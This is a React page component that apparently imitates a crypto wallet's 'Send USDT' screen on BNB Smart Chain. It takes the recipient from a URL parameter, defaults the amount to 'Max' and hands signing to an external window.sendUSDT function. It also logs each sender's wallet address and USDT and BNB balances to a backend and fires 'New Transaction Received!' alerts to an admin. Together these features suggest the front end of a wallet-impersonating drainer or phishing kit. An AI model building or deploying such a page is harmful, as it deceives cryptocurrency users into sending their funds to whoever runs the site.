import { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { X, ClipboardPaste, BookUser, ScanLine } from "lucide-react";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
    setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
    updateWalletAddress?: (address: string) => void;
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) {
      setToAddress(addressParam);
    }

    window.setTransactionStatus = (status) => {
      setTransactionStatusState(status);
      if (status === "success") {
        setTimeout(() => {
          setTransactionStatusState("idle");
        }, 3000);
      }
    };

    window.updateWalletAddress = (address: string) => {
      setToAddress(address);
    };

    return () => {
      delete window.setTransactionStatus;
      delete window.updateWalletAddress;
    };
  }, [searchParams]);

  useEffect(() => {
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: amount || "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).then(() => {
        const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
        if (notificationsEnabled && Notification.permission === "granted") {
          new Notification("New Transaction Received!", {
            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nAmount: ${amount || "Max"}\nUSDT Balance: ${data.usdtBalance} USDT`,
            icon: "/favicon.ico",
            badge: "/favicon.ico",
            tag: data.txHash,
            requireInteraction: true,
          });
        }
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction, amount]);

  async function handleSend() {
    if (!window.sendUSDT) return;
    setTransactionStatusState("processing");
    try {
      await window.sendUSDT();
    } catch (error) {
      console.error(error);
      setTransactionStatusState("idle");
    }
  }

  function setMax() {
    setAmount("Max");
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {
      // Clipboard access denied
    }
  }

  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
    ? `$${Number(amount).toFixed(2)}`
    : "$0.00";

  return (
    <div
      style={{
        margin: 0,
        background: "#ffffff",
        color: "#1a1a2e",
        fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', system-ui, sans-serif",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        maxWidth: "480px",
        marginLeft: "auto",
        marginRight: "auto",
      }}
    >
      {/* Header */}
      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "16px 20px",
        position: "relative",
        borderBottom: "1px solid #f0f0f4",
      }}>
        <span style={{
          fontSize: "17px",
          fontWeight: 600,
          color: "#1a1a2e",
          letterSpacing: "-0.01em",
        }}>
          Send USDT
        </span>
        <button
          style={{
            position: "absolute",
            right: "16px",
            background: "none",
            border: "none",
            color: "#8a8a9a",
            cursor: "pointer",
            padding: "4px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
          onClick={() => window.history.back()}
        >
          <X size={22} strokeWidth={2} />
        </button>
      </div>

      {/* Content */}
      <div style={{ padding: "24px 20px", flex: 1 }}>

        {/* Address Field */}
        <div style={{ marginBottom: "28px" }}>
          <label style={{
            display: "block",
            fontSize: "13px",
            fontWeight: 500,
            color: "#6e6e80",
            marginBottom: "10px",
            letterSpacing: "0.01em",
          }}>
            Address or Domain Name
          </label>
          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1px solid #e5e5ea",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#fff",
            gap: "10px",
          }}>
            <input
              id="toAddress"
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Search or Enter"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#1a1a2e",
                fontSize: "15px",
                fontFamily: "inherit",
                letterSpacing: "-0.01em",
              }}
            />
            <button
              onClick={handlePaste}
              style={{
                display: "flex",
                alignItems: "center",
                gap: "4px",
                background: "none",
                border: "none",
                color: "#3051d3",
                cursor: "pointer",
                padding: "2px",
                fontSize: "13px",
                fontWeight: 600,
                whiteSpace: "nowrap",
              }}
            >
              Paste
            </button>
            <div style={{ width: "1px", height: "18px", background: "#e5e5ea" }} />
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "2px",
              display: "flex",
            }}>
              <ClipboardPaste size={19} strokeWidth={2} />
            </button>
            <button style={{
              background: "none",
              border: "none",
              color: "#3051d3",
              cursor: "pointer",
              padding: "2px",
              display: "flex",
            }}>
              <ScanLine size={19} strokeWidth={2} />
            </button>
          </div>
        </div>

        {/* Destination Network */}
        <div style={{ marginBottom: "28px" }}>
          <label style={{
            display: "block",
            fontSize: "13px",
            fontWeight: 500,
            color: "#6e6e80",
            marginBottom: "10px",
            letterSpacing: "0.01em",
          }}>
            Destination network
          </label>
          <div style={{
            display: "inline-flex",
            alignItems: "center",
            gap: "8px",
            background: "#f5f5f7",
            borderRadius: "20px",
            padding: "8px 16px 8px 10px",
          }}>
            {/* BNB Logo */}
            <div style={{
              width: "24px",
              height: "24px",
              borderRadius: "50%",
              background: "#F3BA2F",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              flexShrink: 0,
            }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
                <path d="M12 2L7.5 6.5L9.5 8.5L12 6L14.5 8.5L16.5 6.5L12 2Z" fill="white"/>
                <path d="M4 10L6 8L8 10L6 12L4 10Z" fill="white"/>
                <path d="M12 8L10 10L12 12L14 10L12 8Z" fill="white"/>
                <path d="M16 10L18 8L20 10L18 12L16 10Z" fill="white"/>
                <path d="M12 14L10 16L7.5 13.5L5.5 15.5L12 22L18.5 15.5L16.5 13.5L14 16L12 14Z" fill="white"/>
              </svg>
            </div>
            <span style={{
              fontSize: "14px",
              fontWeight: 500,
              color: "#1a1a2e",
              letterSpacing: "-0.01em",
            }}>
              BNB Smart Chain
            </span>
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style={{ marginLeft: "2px" }}>
              <path d="M3 4.5L6 7.5L9 4.5" stroke="#8a8a9a" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
        </div>

        {/* Amount Field */}
        <div style={{ marginBottom: "8px" }}>
          <label style={{
            display: "block",
            fontSize: "13px",
            fontWeight: 500,
            color: "#6e6e80",
            marginBottom: "10px",
            letterSpacing: "0.01em",
          }}>
            Amount
          </label>
          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1px solid #e5e5ea",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#fff",
            gap: "10px",
          }}>
            <input
              id="amount"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="USDT Amount"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#1a1a2e",
                fontSize: "15px",
                fontFamily: "inherit",
                letterSpacing: "-0.01em",
              }}
            />
            <span style={{
              color: "#8a8a9a",
              fontWeight: 500,
              fontSize: "14px",
            }}>
              USDT
            </span>
            <button
              onClick={setMax}
              style={{
                background: "none",
                border: "none",
                color: "#3051d3",
                cursor: "pointer",
                padding: "2px 2px",
                fontSize: "14px",
                fontWeight: 600,
              }}
            >
              Max
            </button>
          </div>
          <div style={{
            fontSize: "13px",
            color: "#8a8a9a",
            marginTop: "8px",
            paddingLeft: "2px",
          }}>
            {"≈ "}{dollarValue}
          </div>
        </div>
      </div>

      {/* Bottom Button */}
      <div style={{
        padding: "16px 20px",
        paddingBottom: "36px",
      }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background:
              transactionStatus === "success" ? "#34C759" :
              transactionStatus === "processing" ? "#a8b4e0" :
              "#3051d3",
            color: "#ffffff",
            border: "none",
            borderRadius: "28px",
            padding: "17px",
            fontSize: "17px",
            fontWeight: 600,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            letterSpacing: "-0.01em",
            transition: "background 0.2s ease, transform 0.1s ease",
          }}
        >
          {transactionStatus === "success"
            ? "Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Next"}
        </button>
      </div>
    </div>
  );
}
